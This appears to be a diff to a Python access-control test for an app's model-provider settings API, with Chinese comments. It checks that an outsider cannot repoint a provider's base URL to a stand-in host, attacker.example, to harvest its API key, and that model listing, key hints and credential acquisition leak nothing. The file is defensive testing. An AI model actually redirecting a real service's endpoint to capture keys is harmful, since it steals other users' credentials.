@@ -60,12 +60,19 @@ def test_an_outsider_cannot_repoint_a_provider_and_harvest_its_key(owner_and_out
     assert profile.status_code == 200, profile.text
     profile_id = profile.json()["id"]
 
-    # Repointing base_url is the setup; the models probe is what ships the key.
+    # 改地址是布局,模型探测是那一步"把密钥发出去"的动作。
     assert outsider.patch(
         f"/api/settings/providers/{profile_id}", json={"config": {"base_url": "http://attacker.example/v1"}}
     ).status_code == 403
-    assert outsider.get(f"/api/settings/providers/{profile_id}/models").status_code == 403
     assert outsider.delete(f"/api/settings/providers/{profile_id}").status_code == 403
+
+    # 列模型现在**对所有登录用户开放**(他要据此选自己的默认模型),但那已经带不走任何东西:
+    # 密钥归人之后,探测用的是**发起者自己**那把 —— 他没有,就什么都不带(见 domain/provider_credentials)。
+    assert outsider.get(f"/api/settings/providers/{profile_id}/models").status_code == 200
+    listed = outsider.get("/api/settings/providers").json()
+    assert all(row["key_hint"] == "" for row in listed), "别人的钥匙提示露出来了"
+    acquired = outsider.post(f"/api/agent/provider-credentials/{profile_id}/acquire")
+    assert acquired.json().get("credential") is None, "outsider 拿到了别人的凭据"
 
 
 def test_an_outsider_cannot_grant_plugin_permissions_or_wipe_the_audit_log(owner_and_outsider) -> None:
